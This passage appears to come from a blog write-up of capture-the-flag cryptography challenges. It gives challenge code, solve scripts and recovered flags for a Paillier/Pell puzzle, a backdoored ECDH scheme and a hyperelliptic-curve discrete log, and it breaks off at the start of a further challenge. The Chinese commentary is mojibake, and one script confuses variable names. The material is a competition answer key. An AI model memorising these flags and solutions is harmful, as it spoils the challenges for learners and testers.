<span class="subst">&#123;enc1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc2 = <span class="subst">&#123;enc2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 14381700422128582509148801752355744589949207890477326887251636389639477554903212313766087310581920423926674144511237847467160303159477932732842314969782540035709454603184976310835433114879043016737665256729350745769071186849072915716081380191025215059636548339167264601163525017898164466972776553148697204889820118261937316228241099344357088387154112255824092894798716597134811437852876763391697588672779069166285303075312833415574850549277205130215394422655325352478386576833373623679069271857652029364332047485797407322257853316210866532938722911480593571175419708834718860211036796987231227104370259051299799633809</span></span><br><span class="line"><span class="string">enc1 = 7213976567554002619445032200800186986758840297933991288547009708561953107405266725278346810536664670987171549114913443730366439254199110599202411546254632702440251000149674899033994570393935743323319736976929843596350656674709510612789987746895513057821629144725499933366382123251520676386059405796801097683107223771674383940907066300331503757142088898427893069444164604408189686282018392714450005250018004986102062209998463347007934222341910941474212611569508001910685822097788669516018081617394144015000387497289693096617795809933540456797387940627782045397249431573540932386564021712811633992948508497879189416719996092292320828635490820907122756459412206735413770335545012892724496210585503157766011075566023635046144730429791359690237088629187946232458937292767085665897489251315749496284368726255508362410603108788759785472319449267909859926786774679533591222665476101832482161295321411313525830843915966136814748249906589458905410141906965538387896747375546846618213595165688661941876715858338407833641907024891922856719044736945863722003318526031957256722493189062624177017279248142024760515092698242159769372410662895078523142768353100643884341413944795392762315999109544070401451087596138520908569234305384182336436670714204963907240715652950621301644972412252424876159530992</span></span><br><span class="line"><span class="string">enc2 = 15954854445966181136742750543358176358186230663706091821454832527034640100670779737656720251005109942306013877086451482243141488450122353285697850016200364912263403464109626937525725210545566742746628476797261121321515812788726862118315480354196115424526212965145342675007815411995594752584377871686965531829990461770047418586001518916553661158567047779694730702789677326905844275827365395845945286695577426050334364557405151339008293258932006267159313380746863008928500607405457044370494583863960981060999695448408234857505591647503423149271589648863473472196402149897680041851877198062464480400493467334040101779732999029043327947071232256187123316057998759518569161852646625701393295408789279678540894319137126821001853808931387200759810381958895695749251834840804088478214013923869059004663359509316215974475427057000629842098545503905230785431115754636129549758888267877395566717448365986552725726428222769339088308242580851434964429627168365161743834285778996916154182286570122208454025753108647581888781783757375011437394936853319184725324597963035778640646869326035848170752766298225095197226934969602554875402243303906613183431896300664684256018886119255870435413622515792072064528098344111446380223430819596310173312668368618931885819458529703118195242890075359424013033800260927722161030183373647798407301688760998313223874318513944409702828538509864933624724225689414495687466779277994989628367119101</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>PELLæ–¹ç¨‹æ±‚è§£+äºŒé¡¹å¼å®šç†åº”ç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">14381700422128582509148801752355744589949207890477326887251636389639477554903212313766087310581920423926674144511237847467160303159477932732842314969782540035709454603184976310835433114879043016737665256729350745769071186849072915716081380191025215059636548339167264601163525017898164466972776553148697204889820118261937316228241099344357088387154112255824092894798716597134811437852876763391697588672779069166285303075312833415574850549277205130215394422655325352478386576833373623679069271857652029364332047485797407322257853316210866532938722911480593571175419708834718860211036796987231227104370259051299799633809</span></span><br><span class="line">enc1 = <span class="number">7213976567554002619445032200800186986758840297933991288547009708561953107405266725278346810536664670987171549114913443730366439254199110599202411546254632702440251000149674899033994570393935743323319736976929843596350656674709510612789987746895513057821629144725499933366382123251520676386059405796801097683107223771674383940907066300331503757142088898427893069444164604408189686282018392714450005250018004986102062209998463347007934222341910941474212611569508001910685822097788669516018081617394144015000387497289693096617795809933540456797387940627782045397249431573540932386564021712811633992948508497879189416719996092292320828635490820907122756459412206735413770335545012892724496210585503157766011075566023635046144730429791359690237088629187946232458937292767085665897489251315749496284368726255508362410603108788759785472319449267909859926786774679533591222665476101832482161295321411313525830843915966136814748249906589458905410141906965538387896747375546846618213595165688661941876715858338407833641907024891922856719044736945863722003318526031957256722493189062624177017279248142024760515092698242159769372410662895078523142768353100643884341413944795392762315999109544070401451087596138520908569234305384182336436670714204963907240715652950621301644972412252424876159530992</span></span><br><span class="line">enc2 = <span class="number">15954854445966181136742750543358176358186230663706091821454832527034640100670779737656720251005109942306013877086451482243141488450122353285697850016200364912263403464109626937525725210545566742746628476797261121321515812788726862118315480354196115424526212965145342675007815411995594752584377871686965531829990461770047418586001518916553661158567047779694730702789677326905844275827365395845945286695577426050334364557405151339008293258932006267159313380746863008928500607405457044370494583863960981060999695448408234857505591647503423149271589648863473472196402149897680041851877198062464480400493467334040101779732999029043327947071232256187123316057998759518569161852646625701393295408789279678540894319137126821001853808931387200759810381958895695749251834840804088478214013923869059004663359509316215974475427057000629842098545503905230785431115754636129549758888267877395566717448365986552725726428222769339088308242580851434964429627168365161743834285778996916154182286570122208454025753108647581888781783757375011437394936853319184725324597963035778640646869326035848170752766298225095197226934969602554875402243303906613183431896300664684256018886119255870435413622515792072064528098344111446380223430819596310173312668368618931885819458529703118195242890075359424013033800260927722161030183373647798407301688760998313223874318513944409702828538509864933624724225689414495687466779277994989628367119101</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pell</span>(<span class="params">N, numTry = <span class="number">100</span></span>):</span><br><span class="line">    cf = continued_fraction(sqrt(N))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numTry):</span><br><span class="line">        denom = cf.denominator(i)</span><br><span class="line">        numer = cf.numerator(i)</span><br><span class="line">        <span class="keyword">if</span> numer^<span class="number">2</span> - N * denom^<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> numer, denom</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">N = <span class="number">1117</span></span><br><span class="line">x, y = solve_pell(N)</span><br><span class="line"></span><br><span class="line">flag1 = (enc1 - <span class="number">1</span>) // n**<span class="number">2</span> * inverse_mod(<span class="number">233</span>, n) % n</span><br><span class="line">flag2 = (enc2 % n**<span class="number">2</span> - <span class="number">1</span>) // n * inverse_mod(y, n) % n</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag1)[<span class="number">2</span>:])+<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag2)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;11e89e28-4e27-47f0-a7c7-8e66c18881be&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;xxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_Parameters</span>():</span><br><span class="line">    w = getPrime(<span class="number">25</span>)</span><br><span class="line">    a = getPrime(<span class="number">15</span>)</span><br><span class="line">    b = getPrime(<span class="number">15</span>)</span><br><span class="line">    x = getPrime(<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">return</span> w,a,b,x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Malicious_ECDH</span>():</span><br><span class="line">    w,a,b,x = Get_Parameters()</span><br><span class="line">    </span><br><span class="line">    P = getPrime(<span class="number">512</span>)</span><br><span class="line">    A = getRandomNBitInteger(<span class="number">30</span>)</span><br><span class="line">    B = getRandomNBitInteger(<span class="number">40</span>)</span><br><span class="line">    F = GF(P)</span><br><span class="line">    E = EllipticCurve(F, [A, B])</span><br><span class="line">    G = E.random_point()</span><br><span class="line">    k1 = getRandomNBitInteger(<span class="number">50</span>)</span><br><span class="line">    M1 = k1 * G</span><br><span class="line">    </span><br><span class="line">    Y = x * G</span><br><span class="line">    t = randint(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    t = <span class="number">1</span></span><br><span class="line">    z = (k1 - w * t) * G + (-a*k1 - b) * Y</span><br><span class="line">    k2 = sha256(<span class="built_in">str</span>(z[<span class="number">0</span>]).encode()).digest()[:<span class="number">6</span>]</span><br><span class="line">    k2 = bytes_to_long(k2)</span><br><span class="line">    M2 = k2 * G</span><br><span class="line">    k_rec = getRandomNBitInteger(<span class="number">50</span>)</span><br><span class="line">    B_ = k_rec * G</span><br><span class="line">    shared_key1 = k_rec * M2 </span><br><span class="line">    shared_key2 = k2 * B_</span><br><span class="line">    <span class="keyword">assert</span> shared_key1 == shared_key2</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>((w,a,b,x))</span><br><span class="line">    <span class="built_in">print</span>((A,B,P))</span><br><span class="line">    <span class="built_in">print</span>(G.xy())</span><br><span class="line">    <span class="built_in">print</span>(M1.xy())</span><br><span class="line">    <span class="built_in">print</span>(M2.xy())</span><br><span class="line">    <span class="built_in">print</span>(B_.xy())</span><br><span class="line">    <span class="keyword">return</span> shared_key1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">easy_enc</span>(<span class="params">pt,key</span>):</span><br><span class="line">    key = md5(<span class="built_in">str</span>(<span class="built_in">int</span>(key[<span class="number">0</span>])).encode()).digest()</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    ct = cipher.encrypt(pad(pt,<span class="number">16</span>))</span><br><span class="line">    <span class="built_in">print</span>(ct)</span><br><span class="line">    </span><br><span class="line">key = Malicious_ECDH()</span><br><span class="line">easy_enc(flag,key)</span><br></pre></td></tr></table></figure></blockquote><p>$z = (k_1 - wt) G + (-ak_1 - b)Y=k_1G-wtG+(-ak_1Y-bY)=M_1-wtG-axM_1-bxG$</p><p>åˆ $key2=k_2B$ï¼Œæ±‚è§£å¾—åˆ°å…±äº«keyï¼Œè§£AESå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">w, a, b, x = (<span class="number">31889563</span>, <span class="number">31153</span>, <span class="number">28517</span>, <span class="number">763220531</span>)</span><br><span class="line">A, B, P = (<span class="number">1064988096</span>, <span class="number">802063264240</span>, <span class="number">12565302212045582769124388577074506881895777499095598016237085270545754804754108580101112266821575105979557524040668050927829331647411956215940656838233527</span>)</span><br><span class="line">G = (<span class="number">359297413048687497387015267480858122712978942384458634636826020013871463646849523577260820163767471924019580831592309960165276513810592046624940283279131</span>, <span class="number">9290586933629395882565073588501573863992359052743649536992808088692463307334265060644810911389976524008568647496608901222631270760608733724291675910247770</span>)</span><br><span class="line">M1 = (<span class="number">10930305358553250299911486296334290816447877698513318419802777123689138630792465404548228252534960885714060411282825155604339364568677765849414624286307139</span>, <span class="number">7974701243567912294657709972665114029771010872297725947444110914737157017082782484356147938296124777392629435915168481799494053881335678760116023075462921</span>)</span><br><span class="line">M2 = (<span class="number">497353451039150377961380023736260648366248764299414896780530627602565037872686230259859191906258041016214805015473019277626331812412272940029276101709693</span>, <span class="number">8439756863534455395772111050047162924667310322829095861192323688205133726655589045018003963413676473738236408975953021037765999542116607686218566948766462</span>)</span><br><span class="line">B = (<span class="number">5516900502352630982628557924432908395278078868116449817099410694627060720635892997830736032175084336697081211958825053352950153336574705799801251193930256</span>, <span class="number">10314456103976125214338213393161012551632498638755274752918126246399488480437083278584365543698685202192543021224052941574332651066234126608624976216302370</span>)</span><br><span class="line">enc = <span class="string">b&#x27;\x1a\xfb\xa2\xe1\x86\x04\xfak\x9a\xa3\xd15\xb8\x16\x1d\xbc\xa9S\xf5;\xfa\xf1\x08dn~\xd4\x94\xa4;^*\xf6\xd7\xf10\xa3\xe1k`\x1f-\xef\x80\x16\x80\x80\xe2&#x27;</span></span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(P), [A, B])</span><br><span class="line">G, M1, M2, B = [E(_) <span class="keyword">for</span> _ <span class="keyword">in</span> [G, M1, M2, _B]]</span><br><span class="line">t = <span class="number">1</span></span><br><span class="line">z = M1 - w*t* G - a*x*M1 - b*x*G</span><br><span class="line">k2 = sha256(<span class="built_in">str</span>(z[<span class="number">0</span>]).encode()).digest()[:<span class="number">6</span>]</span><br><span class="line">k2 = bytes_to_long(k2)</span><br><span class="line">key = k2 * _B</span><br><span class="line"></span><br><span class="line">key = md5(<span class="built_in">str</span>(<span class="built_in">int</span>(key[<span class="number">0</span>])).encode()).digest()</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag = cipher.decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;63259ab8-4916-4095-8888-d92c2b003e18&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="magic-dlp"><a href="#magic-dlp" class="headerlink" title="magic_dlp"></a>magic_dlp</h3><blockquote><p>ez hyperelliptic curve problem</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = random_prime(<span class="number">2</span> ^ <span class="number">256</span>) </span><br><span class="line">sx = randint(<span class="number">1</span>, p-<span class="number">1</span>) </span><br><span class="line">g = <span class="number">3</span> </span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(GF(p)) </span><br><span class="line">f = <span class="built_in">sum</span>(randint(<span class="number">0</span>, <span class="number">2</span>^<span class="number">128</span>)*x**i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*g + <span class="number">1</span> + <span class="number">1</span>)) </span><br><span class="line">sy = f(sx).nth_root(<span class="number">2</span>) </span><br><span class="line">HC = HyperellipticCurve(f, <span class="number">0</span>) </span><br><span class="line">J = HC.jacobian()(GF(p)) </span><br><span class="line">r = randint(<span class="number">0</span>, <span class="number">2</span>^<span class="number">40</span>) </span><br><span class="line">D1 = randint(<span class="number">1</span>, p-<span class="number">1</span>)*J(HC((sx, sy))) </span><br><span class="line">D2 = r*D1 </span><br><span class="line"> </span><br><span class="line">key = sha256(<span class="built_in">str</span>(r).encode()).digest() </span><br><span class="line">aes = AES.new(key, AES.MODE_ECB) </span><br><span class="line">ct = aes.encrypt(pad(flag, <span class="number">16</span>)) </span><br><span class="line"><span class="built_in">print</span>(p) </span><br><span class="line"><span class="built_in">print</span>(D1) </span><br><span class="line"><span class="built_in">print</span>(D2) </span><br><span class="line"><span class="built_in">print</span>(b64encode(ct).decode()) </span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">28250322002421485740011517298787354630342182411922678481506757706584776470549</span></span><br><span class="line"><span class="string">(x^3 + 14837843646688223376620895623918856834301419791450189502644075689674679307565*x^2 + 11342007530582447297077768070260591643434731986676417772353996440271447424229*x + 17253160355772506039833501683117771635464243068672344160916188778934194482626, y + 11583638164648709615113883733024362701865856309079457013197399476805753481773*x^2 + 14799567073594539924214272546716232642453764116619810153125493046155930087914*x + 9020351128638199743425310619576234999021949822922952447017982687315971687269)</span></span><br><span class="line"><span class="string">(x^3 + 24086141351204484270563731092873802082275121784385117167214060247819862896159*x^2 + 12580133579221229248448771717453263525988015199573816289207551576399335707433*x + 2025561351219044126154032254344655853662339878505961213456370741923912105725, y + 3024337373411188543472600372581043552807342888844351463589310783585361491167*x^2 + 22142729345652208596100988590287276835636512968984185855026844080502870977199*x + 24006419269594097580414614133924457311337109216133817568627246946606650903690)</span></span><br><span class="line"><span class="string">IuhuwMMbrawsh63urhYqbaFHbXIhhHoiECUKqlg29b6ZxEg8QnD2Iy7QerX4kBj0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>è¶…æ¤­åœ†æ›²çº¿ä¸‹çš„DLPé—®é¢˜ã€‚</p><p>é¦–å…ˆæ¢å¤ $f$ï¼Œå‚è€ƒ <a href="https://furutsuki.hatenablog.com/entry/2023/02/13/231456#Crypto-300-hell">https://furutsuki.hatenablog.com/entry/2023/02/13/231456#Crypto-300-hell</a> å¯ç”¨CRTå¾—åˆ° $f$ï¼Œç‚¹æ•°ä¸è¶³å¤Ÿä½¿å¾—ä¸è¶³ä»¥æ¢å¤æ­£å¸¸çš„ $f$ã€‚</p><p>æ³¨æ„åˆ° $p$ ä¸º 256ä½ï¼Œè€Œ $f$ çš„ç³»æ•°çš†ä¸º 128ä½ï¼Œå¯ä»¥ç”¨ç±»ä¼¼RLWEçš„æ–¹æ³•LLLç®—å‡º $f$ï¼Œæœ€åï¼Œ$r$ ä¸åˆ° 40ä½ï¼Œå¯ä»¥ç”¨BSGSç®—æ³•æ±‚è§£DLPé—®é¢˜ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">p = <span class="number">28250322002421485740011517298787354630342182411922678481506757706584776470549</span></span><br><span class="line">PR = GF(p)[<span class="string">&quot;x&quot;</span>]</span><br><span class="line">x = PR.gen()</span><br><span class="line">y = <span class="number">0</span></span><br><span class="line">D1 = (</span><br><span class="line">    x</span><br><span class="line">    ^ <span class="number">3</span></span><br><span class="line">    + <span class="number">14837843646688223376620895623918856834301419791450189502644075689674679307565</span> * x</span><br><span class="line">    ^ <span class="number">2</span></span><br><span class="line">    + <span class="number">11342007530582447297077768070260591643434731986676417772353996440271447424229</span> * x</span><br><span class="line">    + <span class="number">17253160355772506039833501683117771635464243068672344160916188778934194482626</span>,</span><br><span class="line">    y</span><br><span class="line">    + <span class="number">11583638164648709615113883733024362701865856309079457013197399476805753481773</span> * x</span><br><span class="line">    ^ <span class="number">2</span></span><br><span class="line">    + <span class="number">14799567073594539924214272546716232642453764116619810153125493046155930087914</span> * x</span><br><span class="line">    + <span class="number">9020351128638199743425310619576234999021949822922952447017982687315971687269</span>,</span><br><span class="line">)</span><br><span class="line">D2 = (</span><br><span class="line">    x</span><br><span class="line">    ^ <span class="number">3</span></span><br><span class="line">    + <span class="number">24086141351204484270563731092873802082275121784385117167214060247819862896159</span> * x</span><br><span class="line">    ^ <span class="number">2</span></span><br><span class="line">    + <span class="number">12580133579221229248448771717453263525988015199573816289207551576399335707433</span> * x</span><br><span class="line">    + <span class="number">2025561351219044126154032254344655853662339878505961213456370741923912105725</span>,</span><br><span class="line">    y + <span class="number">3024337373411188543472600372581043552807342888844351463589310783585361491167</span> * x</span><br><span class="line">    ^ <span class="number">2</span></span><br><span class="line">    + <span class="number">22142729345652208596100988590287276835636512968984185855026844080502870977199</span> * x</span><br><span class="line">    + <span class="number">24006419269594097580414614133924457311337109216133817568627246946606650903690</span>,</span><br><span class="line">)</span><br><span class="line">ct = b64decode(<span class="string">&quot;IuhuwMMbrawsh63urhYqbaFHbXIhhHoiECUKqlg29b6ZxEg8QnD2Iy7QerX4kBj0&quot;</span>)</span><br><span class="line"></span><br><span class="line">rems = [D1[<span class="number">1</span>] ^ <span class="number">2</span>, D2[<span class="number">1</span>] ^ <span class="number">2</span>]</span><br><span class="line">mods = [D1[<span class="number">0</span>], D2[<span class="number">0</span>]]</span><br><span class="line">ff = crt(rems, mods)</span><br><span class="line">L = prod(mods)</span><br><span class="line"><span class="built_in">print</span>(ff)</span><br><span class="line"></span><br><span class="line">M = matrix(</span><br><span class="line">    ZZ,</span><br><span class="line">    [</span><br><span class="line">        vector(ff.padded_list(<span class="number">8</span>)),</span><br><span class="line">        vector(L.padded_list(<span class="number">8</span>)),</span><br><span class="line">        vector((L * x).padded_list(<span class="number">8</span>)),</span><br><span class="line">        *<span class="built_in">list</span>(matrix.identity(<span class="number">8</span>) * p),</span><br><span class="line">    ],</span><br><span class="line">)</span><br><span class="line">M = M.augment(vector([<span class="number">1</span>] + [<span class="number">0</span>] * (<span class="number">2</span> + <span class="number">8</span>)))</span><br><span class="line">M[:, -<span class="number">1</span>] *= <span class="number">2</span>**<span class="number">128</span></span><br><span class="line">M = M.LLL()</span><br><span class="line">M[:, -<span class="number">1</span>] /= <span class="number">2</span>**<span class="number">128</span></span><br><span class="line">target = <span class="built_in">next</span>(row <span class="keyword">for</span> row <span class="keyword">in</span> M <span class="keyword">if</span> row[-<span class="number">1</span>] == <span class="number">1</span> <span class="keyword">or</span> row[-<span class="number">1</span>] == -<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> target[-<span class="number">1</span>] == -<span class="number">1</span>:</span><br><span class="line">    target = -target</span><br><span class="line">f = PR(<span class="built_in">list</span>(target[:-<span class="number">1</span>]))</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">HC = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = HC.jacobian()(GF(p))</span><br><span class="line">D1 = J(D1)</span><br><span class="line">D2 = J(D2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># BSGS</span></span><br><span class="line"><span class="comment"># D2=(v+u*M)D1</span></span><br><span class="line"><span class="comment"># D2-vD1=u*M*D1</span></span><br><span class="line">M = <span class="number">2</span>**<span class="number">20</span></span><br><span class="line">lhs = &#123;&#125;</span><br><span class="line">T = D2</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(M)):</span><br><span class="line">    lhs[T] = v</span><br><span class="line">    T = T - D1</span><br><span class="line">MD1 = M * D1</span><br><span class="line">T = <span class="number">0</span> * MD1</span><br><span class="line"><span class="keyword">for</span> u <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(M)):</span><br><span class="line">    <span class="keyword">if</span> T <span class="keyword">in</span> lhs:</span><br><span class="line">        v = lhs[T]</span><br><span class="line">        r = u * M + v</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    T = T + MD1</span><br><span class="line"></span><br><span class="line">key = sha256(<span class="built_in">str</span>(r).encode()).digest()</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">pt = unpad(aes.decrypt(ct), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(pt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;72825d3f-74f0-0a0e-ba1c-895eee99dc29&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Cisticola"><a href="#Cisticola" class="headerlink" title="Cisticola"></a>Cisticola</h3><blockquote><p>Let me tell you a story about polynomial.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Q = [...]</span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- 